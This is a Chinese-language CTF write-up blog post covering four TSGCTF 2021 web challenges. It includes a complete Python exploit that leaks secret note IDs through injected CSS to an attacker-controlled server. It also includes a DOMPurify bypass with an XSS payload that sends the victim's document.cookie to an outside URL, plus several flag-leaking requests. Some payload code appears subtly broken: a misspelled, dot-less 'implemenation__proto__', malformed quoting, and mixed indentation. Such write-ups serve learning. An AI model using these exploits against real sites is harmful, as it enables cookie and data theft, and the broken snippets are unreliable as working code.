---
title: "TSGCTF2021 Wp"
slug: "tsgctf2021-wp"
description: "其实完全不算是wp 看着wp的菜鸡复现而已"
date: 2021-10-04T16:44:41+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://score.ctf.tsg.ne.jp/challenges  |  https://ctftime.org/event/1431/tasks/

## Web/Welcome to TSG CTF!

> **We want to welcome you,** *seriously.*

![image-20211004010601885](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004010601885.png)

抓包后发现我们输入的值是post的json中的key部分而不是value，很奇怪

给了源码，看下app.js

![image-20211004083305948](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004083305948.png)

11行有个比较，要通过它，可以把body置空访问（用burp的话要改一下Content-Type，默认的application/json是不能置空的），`typeof null === 'object'`

```bash
$ curl "http://34.84.69.72:34705/" -X POST
{"statusCode":500,"error":"Internal Server Error","message":"Cannot read property 'TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}' of null"}
```

flag会在报错中出现！

`TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}`

## Web/Udon

> **Ta-dah! Here comes udon!**

Udon Note，一眼xss之类的

我们发出去的note中的尖括号会被转义为实体字符，Reset会清空cookie，连带着消失之前发布过的Note

![image-20211004080116886](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080116886.png)

有Tell Admin About This Udon Note的选项

————没什么想法 以下是平淡的复现过程

看源码，main.go

![image-20211004155626744](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155626744.png)

我们需要找到那个特殊的notes_id

接着往下看

![image-20211004155826973](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155826973.png)

http的相应头可以泄露一些信息，这里是入手点

仅在Firefox中有一个`Link`请求头，几乎等同于HTML中的`<link>`标签

```
Link: </foo.css>; rel="stylesheet"; type="text/css"
<link rel="stylesheet" href="/foo.css">
```

我们可以向app中的任意一页注入任意的css

同时也有需要Bypass的地方，比如这里的CSP策略`style-src 'self'`

![image-20211004160452260](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004160452260.png)

我们可以先创建一个带有恶意css的note，再将这个note的链接放入`Link`请求头中

```
http://ip:port/?k=Link&v=%3C%2F(<URL of a note with styles to inject>)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22
```

```python
# exp.py
from flask import Flask, request
import requests
import urllib.parse
import string

TARGET_BASE = "http://localhost:8080"

LEAK_LENGTH = 10
CHAR_CANDIDATES = string.ascii_letters + string.digits

EXPLOIT_BASE_ADDR = "http://host.docker.internal:1337"
app = Flask(__name__)
s = requests.Session()

def build_payload(prefix: str, candidates: "List[str]"):
    global EXPLOIT_BASE_ADDR
    assert EXPLOIT_BASE_ADDR != "", "EXPLOIT_BASE_ADDR is not set"

    payload = "{}"
    for candidate in candidates:
        id_prefix_to_try = prefix + candidate
        matcher = ''.join(map(lambda x: '\\' + hex(ord(x))
                              [2:], '/notes/' + id_prefix_to_try))
		payload += "a[href^=" + matcher + \
            "] { background-image: url(" + EXPLOIT_BASE_ADDR + \
            "/leak?q=" + urllib.parse.quote(id_prefix_to_try) + "); }"
    return payload


def post_note(title: str, description: str) -> str:
    r = s.post(TARGET_BASE + "/notes", data={
        "title": title,
        "description": description,
    }, headers={
        "content-type": "application/x-www-form-urlencoded"
    }, allow_redirects=False)
    assert r.status_code == 302, "invalid status code: {}".format(
        r.status_code)
    return r.headers['Location'].split('/notes/')[-1]


def report_note_as_stylesheet(id: str) -> None:
    header_value = '</notes/{}>; rel="stylesheet"; type="text/css"'.format(id)
    r = s.post(TARGET_BASE + "/tell", data={
        "path": "/?k=Link&v={}".format(urllib.parse.quote(header_value)),
    }, allow_redirects=False)
    assert r.status_code == 302, "invalid status code: {}".format(
        r.status_code)
    return None


@app.route("/start")
def start():
    p = build_payload("", CHAR_CANDIDATES)
    exploit_id = post_note("exploit", p)
    report_note_as_stylesheet(exploit_id)
    print("[info]: started exploit with a new note: {}/notes/{}".format(TARGET_BASE, exploit_id))
    return ""


@app.route("/leak")
def leak():
    leaked_id = request.args.get('q')
    if len(leaked_id) == LEAK_LENGTH:
        print("[+] leaked (full ID): {}".format(leaked_id))
        r = s.get(TARGET_BASE + "/notes/" + leaked_id)
        print(r.text)
    else:
        print("[info] leaked: {}{}".format(
            leaked_id, "*" * (LEAK_LENGTH - len(leaked_id))))

        p = build_payload(leaked_id, CHAR_CANDIDATES)
        exploit_id = post_note("exploit", p)
        report_note_as_stylesheet(exploit_id)
        print("[info]: invoked crawler with a new note: " + exploit_id)
    return ""


if __name__ == "__main__":
    print("[info] running app ...")
    app.run(host="0.0.0.0", port=1337)
```

详细内容参见->[wp](https://diary.shift-js.info/tsgctf-2021-udon/)

## Web/Beginner's Web 2021

> **Made drunk, so solved drunk.**

![image-20211004080745266](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080745266.png)

给了源码，看下index.js，emmmmmm，创建了session.routes

![image-20211004081546667](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004081546667.png)

但是flag并不会在最后渲染的route中出现

![image-20211004092636947](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004092636947.png)

 所以我们想利用GetSalt处的`session.salt='flag'`来转到flag的路由上来获得flag

但是[salt]会导致重写flag，所以我们想要的session是这样的状态

```js
session = {
    routes: {
        flag: ...,
        index: ...,
        ...
        [salt]: ..., // salt is anything different from 'flag'
    },
    salt: 'flag',
}
```

首先用`GET /?action=SetSalt&data=flag`来让`salt='flag'`，session会变成这样

```js
session = {
	route: {
		flag: ...,	// this route is overwritten and not accessible
		index: ...,
		...
		flag: ...,	// here is salt
	},
	salt: 'flag',
}
```

我们想回复到route只有一个flag并且可达的状态，但是又不想删除掉`salt: 'flag'`

关键之处在于`set_salt`，它想完成的任务是一起更新routes和salt的值

```js
set_salt: async (salt) => {
	session.routes = await setRoutes(session, salt);
	session.salt = salt;
	return 'ok';
}
```

第二行中，我们要`await setRoutes`，相当于

```js
set_salt: (salt) => {
	return setRoutes(session, salt).then((result) => {
		session.routes = result;
		session.salt = salt;
		return 'ok';
	});
}
```

这里会要到一个setRoutes的返回值result

```js
const setRoutes = async (session, salt) => {
	const index = await fs.readFile('index.html');
	session.routes = {
		// redacted
		[salt]: () => salt,
	};
	return session.routes;
};
```

很没必要的操作，又一遍setRoutes，纯属脱裤子放屁

当我们设置`salt = 'then'`时，情况就不一样了

```js
{
	//redacted
	then: () => salt,
}
```

这个特殊的then关键字一出来，就很特殊，解释器会试图把它认作是await中要调用的then的部分，但是并没有await需要它这个then执行的result来作为返回值，就卡死在这里了，这个salt无处可去

So，`GET /?action=SetSalt&data=then`之后session将是这样的

```js
session = {
    routes: {
        flag: ...,
        index: ...,
        ...
        then: ...,
    },
    salt: 'flag',
}
```

只要`GET /?action=GetSalt`即可，因为

```js
return session.routes[route](data);	// route = session.salt here (just flag)
```

具体操作一张动图就能说清楚

![img](https://i.imgur.com/8q7R2If.gif)

最后，这个**的东西学名叫[Thenable Object](https://masteringjs.io/tutorials/fundamentals/thenable)，谢谢你，javascript😅

参考：[wp](https://hackmd.io/@hakatashi/ryRg7oLEt)

![image-20211004090604105](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004090604105.png)

## Web/Giita

> Gibson Les Paul Standard.
>
> Steal Cookie.

😭😭😭又是cookie

![image-20211004082810346](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004082810346.png)

看源码，app.js

![image-20211004161650511](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161650511.png)

11行的正则匹配了空格、字母、数字、下划线，但是多余了一个`.`

![image-20211004161816780](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161816780.png)

会把theme放进去进行一个过滤

![image-20211004162229240](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004162229240.png)

然后拼接到stylesheet link中，就再没有什么过滤了

我们可以注入到href这里，比如

```html
<!-- theme=x%20onerror%3Dalert -->
<link rel="stylesheet" href=x onerror=alert>
```

要完整的注入js代码，我们需要cheat DOMPurify

DOMPurify会先[检测对象](https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L156-L160)在不在`DOMPurify.isSupported`的范围内

![image-20211004163456492](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004163456492.png)

所以呢，我们把它给关咯

```
delete document.implementation.__proto__.createHTMLDocument
```

最后的Payload，U+00A0(NBSP)不在html的空白符中，但是在Javascript的空白符中

```javascript
axios({
	method: 'post',
	url: `http://${host}:${port}/`,
	headers: {
		'content-type': 'application/x-www-form-urlencoded',
	},
	data: qs.encode({
		theme: 'x onerror=delete\xA0document.implemenation__proto__.createHTMLDocument',
		title: 'x',
		body: `<img src="x" onerror="location.href"='${url}?' + document.cookie>`,
	}),
});
```

完整参见->[wp](https://hackmd.io/@hakatashi/HkgG02U4t)

------

就是菜 不会做 勉强看看wp 还不一定看得懂

铁废物了😅
